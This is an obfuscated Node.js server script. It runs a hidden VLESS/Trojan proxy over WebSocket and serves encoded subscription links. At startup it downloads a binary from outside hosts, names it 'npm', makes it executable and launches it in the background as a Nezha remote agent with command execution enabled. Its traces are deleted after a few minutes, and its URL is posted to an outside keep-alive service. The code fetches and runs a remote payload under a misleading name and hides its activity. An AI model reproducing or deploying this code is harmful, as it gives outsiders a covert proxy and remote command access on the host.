const _0x2798=['substr','find','toString','createHash','readUInt8','text/html','trim','\x20-p\x20','reduce','error','Automatic\x20Access\x20Task\x20added\x20successfully','digest','Server','close','npm\x20download\x20successfully','https://amd64.ssss.nyc.mn/v1','crypto','writeHead','then','pop','NAME','get','chmod\x20+x\x20npm','join','unlink','catch','from','https://oooo.serv00.net/add-url','https://amd64.ssss.nyc.mn/agent','https://arm64.ssss.nyc.mn/v1','8443','https://arm64.ssss.nyc.mn/agent','NEZHA_PORT','data','includes','finish','2087','axios','message','text/plain','connection','Answer','buffer','createServer','child_process','UUID','NEZHA_SERVER','readUInt16BE','writeFileSync','env','test','write','error:\x20','1234.abc.com','https://dns.google/resolve?name=','sha224','npm\x20running\x20error:','&type=A','npm','utf-8','config.yaml','true','8.8.4.4','post','slice','length','log','arch','https://api.ip.sb/geoip','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','utf8','decode','end','application/json','every','listen','send','aarch64','setsid\x20nohup\x20./npm\x20-s\x20','url','client_secret:\x20','&path=%2F','@cdns.doon.eu.org:443?security=tls&sni=','pipe','1.1.1.1','isp'];const _0x4d60=function(_0x2798a3,_0x4d6094){_0x2798a3=_0x2798a3-0x0;let _0x4fea19=_0x2798[_0x2798a3];return _0x4fea19;};const os=require('os');const http=require('http');const fs=require('fs');const axios=require(_0x4d60('0x25'));const net=require('net');const path=require('path');const crypto=require(_0x4d60('0x10'));const {Buffer}=require(_0x4d60('0x2a'));const {exec,execSync}=require(_0x4d60('0x2c'));const {WebSocket,createWebSocketStream}=require('ws');const UUID=process['env'][_0x4d60('0x2d')]||'f675a3b8-62b8-4896-ae99-0804ccfe16cb';const NEZHA_SERVER=process['env'][_0x4d60('0x2e')]||'';const NEZHA_PORT=process[_0x4d60('0x31')][_0x4d60('0x20')]||'';const NEZHA_KEY=process[_0x4d60('0x31')]['NEZHA_KEY']||'';const DOMAIN=process[_0x4d60('0x31')]['DOMAIN']||_0x4d60('0x35');const AUTO_ACCESS=process['env']['AUTO_ACCESS']||![];const WSPATH=process['env']['WSPATH']||UUID['slice'](0x0,0x8);const SUB_PATH=process['env']['SUB_PATH']||'sub';const NAME=process['env'][_0x4d60('0x14')]||'';const PORT=process['env']['PORT']||0xbb8;let ISP='';const GetISP=async()=>{try{const _0x4c4fac=await axios[_0x4d60('0x15')](_0x4d60('0x44'));const _0x156bd8=_0x4c4fac[_0x4d60('0x21')];ISP=(_0x156bd8['country_code']+'-'+_0x156bd8[_0x4d60('0x55')])['replace'](/ /g,'_');}catch(_0x5e7d74){ISP='Unknown';}};GetISP();const httpServer=http[_0x4d60('0x2b')]((_0x43cef7,_0x429c56)=>{if(_0x43cef7[_0x4d60('0x4f')]==='/'){const _0x431ea1=path['join'](__dirname,'index.html');fs['readFile'](_0x431ea1,_0x4d60('0x46'),(_0x5afd8f,_0xb65bfd)=>{if(_0x5afd8f){_0x429c56[_0x4d60('0x11')](0xc8,{'Content-Type':'text/html'});_0x429c56['end']('Hello\x20world!');return;}_0x429c56['writeHead'](0xc8,{'Content-Type':_0x4d60('0x5')});_0x429c56['end'](_0xb65bfd);});return;}else if(_0x43cef7['url']==='/'+SUB_PATH){const _0x59fb22=NAME?NAME+'-'+ISP:ISP;const _0x1ba132='vless://'+UUID+'@cdns.doon.eu.org:443?encryption=none&security=tls&sni='+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x4d60('0x51')+WSPATH+'#'+_0x59fb22;const _0x47286e='trojan://'+UUID+_0x4d60('0x52')+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x4d60('0x51')+WSPATH+'#'+_0x59fb22;const _0x19afb5=_0x1ba132+'\x0a'+_0x47286e;const _0x28c79d=Buffer[_0x4d60('0x1a')](_0x19afb5)['toString']('base64');_0x429c56['writeHead'](0xc8,{'Content-Type':_0x4d60('0x27')});_0x429c56[_0x4d60('0x48')](_0x28c79d+'\x0a');}else{_0x429c56[_0x4d60('0x11')](0x194,{'Content-Type':_0x4d60('0x27')});_0x429c56['end']('Not\x20Found\x0a');}});const wss=new WebSocket[(_0x4d60('0xc'))]({'server':httpServer});const uuid=UUID['replace'](/-/g,'');const DNS_SERVERS=[_0x4d60('0x3e'),_0x4d60('0x54')];function resolveHost(_0x48177c){return new Promise((_0x1f3011,_0x4bd3d8)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x4d60('0x32')](_0x48177c)){_0x1f3011(_0x48177c);return;}let _0x5d1ad0=0x0;function _0x1c7564(){if(_0x5d1ad0>=DNS_SERVERS['length']){_0x4bd3d8(new Error('Failed\x20to\x20resolve\x20'+_0x48177c+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x3eb4c8=DNS_SERVERS[_0x5d1ad0];_0x5d1ad0++;const _0x36f0ae=_0x4d60('0x36')+encodeURIComponent(_0x48177c)+_0x4d60('0x39');axios['get'](_0x36f0ae,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x4d60('0x12')](_0x298e45=>{const _0x318cbf=_0x298e45['data'];if(_0x318cbf['Status']===0x0&&_0x318cbf['Answer']&&_0x318cbf[_0x4d60('0x29')]['length']>0x0){const _0x392f8c=_0x318cbf[_0x4d60('0x29')][_0x4d60('0x1')](_0x2b1c13=>_0x2b1c13['type']===0x1);if(_0x392f8c){_0x1f3011(_0x392f8c[_0x4d60('0x21')]);return;}}_0x1c7564();})[_0x4d60('0x19')](_0x1f2574=>{_0x1c7564();});}_0x1c7564();});}function handleVlessConnection(_0x33a283,_0x2c6dff){const [_0x2f677a]=_0x2c6dff;const _0x1819ff=_0x2c6dff[_0x4d60('0x40')](0x1,0x11);if(!_0x1819ff[_0x4d60('0x4a')]((_0x4faee3,_0x41c8fb)=>_0x4faee3==parseInt(uuid['substr'](_0x41c8fb*0x2,0x2),0x10)))return![];let _0x16eea9=_0x2c6dff['slice'](0x11,0x12)[_0x4d60('0x4')]()+0x13;const _0x442b20=_0x2c6dff[_0x4d60('0x40')](_0x16eea9,_0x16eea9+=0x2)[_0x4d60('0x2f')](0x0);const _0x24695c=_0x2c6dff['slice'](_0x16eea9,_0x16eea9+=0x1)[_0x4d60('0x4')]();const _0x8e3d2=_0x24695c==0x1?_0x2c6dff['slice'](_0x16eea9,_0x16eea9+=0x4)[_0x4d60('0x17')]('.'):_0x24695c==0x2?new TextDecoder()[_0x4d60('0x47')](_0x2c6dff['slice'](_0x16eea9+0x1,_0x16eea9+=0x1+_0x2c6dff['slice'](_0x16eea9,_0x16eea9+0x1)[_0x4d60('0x4')]())):_0x24695c==0x3?_0x2c6dff[_0x4d60('0x40')](_0x16eea9,_0x16eea9+=0x10)[_0x4d60('0x8')]((_0x786de6,_0xcfab1b,_0x51a77b,_0x1428c6)=>_0x51a77b%0x2?_0x786de6['concat'](_0x1428c6['slice'](_0x51a77b-0x1,_0x51a77b+0x1)):_0x786de6,[])['map'](_0x56ac1e=>_0x56ac1e[_0x4d60('0x2f')](0x0)['toString'](0x10))[_0x4d60('0x17')](':'):'';_0x33a283[_0x4d60('0x4c')](new Uint8Array([_0x2f677a,0x0]));const _0x47d90c=createWebSocketStream(_0x33a283);resolveHost(_0x8e3d2)[_0x4d60('0x12')](_0x3bd403=>{net['connect']({'host':_0x3bd403,'port':_0x442b20},function(){this[_0x4d60('0x33')](_0x2c6dff[_0x4d60('0x40')](_0x16eea9));_0x47d90c['on'](_0x4d60('0x9'),()=>{})['pipe'](this)['on']('error',()=>{})['pipe'](_0x47d90c);})['on'](_0x4d60('0x9'),()=>{});})['catch'](_0x3dd74c=>{net['connect']({'host':_0x8e3d2,'port':_0x442b20},function(){this[_0x4d60('0x33')](_0x2c6dff['slice'](_0x16eea9));_0x47d90c['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})['pipe'](_0x47d90c);})['on']('error',()=>{});});return!![];}function handleTrojanConnection(_0x4d9322,_0x57530a){try{if(_0x57530a[_0x4d60('0x41')]<0x3a)return![];const _0x2554b7=_0x57530a[_0x4d60('0x40')](0x0,0x38)['toString']();const _0x386cac=[UUID];let _0x340622=null;for(const _0x4a214b of _0x386cac){const _0x269fde=crypto[_0x4d60('0x3')](_0x4d60('0x37'))['update'](_0x4a214b)[_0x4d60('0xb')]('hex');if(_0x269fde===_0x2554b7){_0x340622=_0x4a214b;break;}}if(!_0x340622)return![];let _0x228593=0x38;if(_0x57530a[_0x228593]===0xd&&_0x57530a[_0x228593+0x1]===0xa){_0x228593+=0x2;}const _0x1765f7=_0x57530a[_0x228593];if(_0x1765f7!==0x1)return![];_0x228593+=0x1;const _0x52763c=_0x57530a[_0x228593];_0x228593+=0x1;let _0x38cf1c,_0x42b1dd;if(_0x52763c===0x1){_0x38cf1c=_0x57530a['slice'](_0x228593,_0x228593+0x4)[_0x4d60('0x17')]('.');_0x228593+=0x4;}else if(_0x52763c===0x3){const _0x493180=_0x57530a[_0x228593];_0x228593+=0x1;_0x38cf1c=_0x57530a[_0x4d60('0x40')](_0x228593,_0x228593+_0x493180)[_0x4d60('0x2')]();_0x228593+=_0x493180;}else if(_0x52763c===0x4){_0x38cf1c=_0x57530a[_0x4d60('0x40')](_0x228593,_0x228593+0x10)['reduce']((_0x2746cb,_0x2ffc42,_0x21e7e7,_0xc878bb)=>_0x21e7e7%0x2?_0x2746cb['concat'](_0xc878bb['slice'](_0x21e7e7-0x1,_0x21e7e7+0x1)):_0x2746cb,[])['map'](_0x36dd73=>_0x36dd73[_0x4d60('0x2f')](0x0)['toString'](0x10))['join'](':');_0x228593+=0x10;}else{return![];}_0x42b1dd=_0x57530a[_0x4d60('0x2f')](_0x228593);_0x228593+=0x2;if(_0x228593<_0x57530a[_0x4d60('0x41')]&&_0x57530a[_0x228593]===0xd&&_0x57530a[_0x228593+0x1]===0xa){_0x228593+=0x2;}const _0x57a196=createWebSocketStream(_0x4d9322);resolveHost(_0x38cf1c)['then'](_0xca9ceb=>{net['connect']({'host':_0xca9ceb,'port':_0x42b1dd},function(){if(_0x228593<_0x57530a['length']){this[_0x4d60('0x33')](_0x57530a[_0x4d60('0x40')](_0x228593));}_0x57a196['on']('error',()=>{})[_0x4d60('0x53')](this)['on']('error',()=>{})['pipe'](_0x57a196);})['on'](_0x4d60('0x9'),()=>{});})['catch'](_0x3f8782=>{net['connect']({'host':_0x38cf1c,'port':_0x42b1dd},function(){if(_0x228593<_0x57530a['length']){this[_0x4d60('0x33')](_0x57530a[_0x4d60('0x40')](_0x228593));}_0x57a196['on'](_0x4d60('0x9'),()=>{})['pipe'](this)['on'](_0x4d60('0x9'),()=>{})['pipe'](_0x57a196);})['on'](_0x4d60('0x9'),()=>{});});return!![];}catch(_0x3deb67){return![];}}wss['on'](_0x4d60('0x28'),(_0x3aafb4,_0x1c03b0)=>{const _0x3ca250=_0x1c03b0['url']||'';_0x3aafb4['once'](_0x4d60('0x26'),_0x5dbe45=>{if(_0x5dbe45[_0x4d60('0x41')]>0x11&&_0x5dbe45[0x0]===0x0){const _0x23767c=_0x5dbe45['slice'](0x1,0x11);const _0x303394=_0x23767c['every']((_0x2d8aef,_0x38b752)=>_0x2d8aef==parseInt(uuid[_0x4d60('0x0')](_0x38b752*0x2,0x2),0x10));if(_0x303394){if(!handleVlessConnection(_0x3aafb4,_0x5dbe45)){_0x3aafb4[_0x4d60('0xd')]();}return;}}if(!handleTrojanConnection(_0x3aafb4,_0x5dbe45)){_0x3aafb4[_0x4d60('0xd')]();}})['on'](_0x4d60('0x9'),()=>{});});const getDownloadUrl=()=>{const _0x2d3393=os[_0x4d60('0x43')]();if(_0x2d3393==='arm'||_0x2d3393==='arm64'||_0x2d3393===_0x4d60('0x4d')){if(!NEZHA_PORT){return _0x4d60('0x1d');}else{return _0x4d60('0x1f');}}else{if(!NEZHA_PORT){return _0x4d60('0xf');}else{return _0x4d60('0x1c');}}};const downloadFile=async()=>{if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x3a44e3=getDownloadUrl();const _0xd2caba=await axios({'method':_0x4d60('0x15'),'url':_0x3a44e3,'responseType':'stream'});const _0x13ab22=fs['createWriteStream'](_0x4d60('0x3a'));_0xd2caba[_0x4d60('0x21')]['pipe'](_0x13ab22);return new Promise((_0x1c5eb1,_0x21b26b)=>{_0x13ab22['on'](_0x4d60('0x23'),()=>{console['log'](_0x4d60('0xe'));exec(_0x4d60('0x16'),_0x4c23ed=>{if(_0x4c23ed)_0x21b26b(_0x4c23ed);_0x1c5eb1();});});_0x13ab22['on']('error',_0x21b26b);});}catch(_0xedb31f){throw _0xedb31f;}};const runnz=async()=>{try{const _0x5c90fb=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x4d60('0x3b')});if(_0x5c90fb[_0x4d60('0x6')]()!==''){console['log']('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x3ca87a){}await downloadFile();let _0x344230='';let _0x1edabf=['443',_0x4d60('0x1e'),'2096',_0x4d60('0x24'),'2083','2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x1a38ca=_0x1edabf['includes'](NEZHA_PORT)?'--tls':'';_0x344230=_0x4d60('0x4e')+NEZHA_SERVER+':'+NEZHA_PORT+_0x4d60('0x7')+NEZHA_KEY+'\x20'+_0x1a38ca+_0x4d60('0x45');}else if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x461793=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')[_0x4d60('0x13')]():'';const _0x525eaa=_0x1edabf[_0x4d60('0x22')](_0x461793)?_0x4d60('0x3d'):'false';const _0x2bdd5b=_0x4d60('0x50')+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x525eaa+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x4d60('0x30')](_0x4d60('0x3c'),_0x2bdd5b);}_0x344230='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console['log']('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}try{exec(_0x344230,{'shell':'/bin/bash'},_0x32fdca=>{if(_0x32fdca)console[_0x4d60('0x9')](_0x4d60('0x38'),_0x32fdca);else console[_0x4d60('0x42')]('npm\x20is\x20running');});}catch(_0x14095d){console['error'](_0x4d60('0x34')+_0x14095d);}};async function addAccessTask(){if(!AUTO_ACCESS)return;if(!DOMAIN){return;}const _0x30811c='https://'+DOMAIN+'/'+SUB_PATH;try{const _0xd3b80f=await axios[_0x4d60('0x3f')](_0x4d60('0x1b'),{'url':_0x30811c},{'headers':{'Content-Type':_0x4d60('0x49')}});console[_0x4d60('0x42')](_0x4d60('0xa'));}catch(_0x4d3729){}}const delFiles=()=>{fs[_0x4d60('0x18')](_0x4d60('0x3a'),()=>{});fs['unlink']('config.yaml',()=>{});};httpServer[_0x4d60('0x4b')](PORT,()=>{runnz();setTimeout(()=>{delFiles();},0x2bf20);addAccessTask();console['log']('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
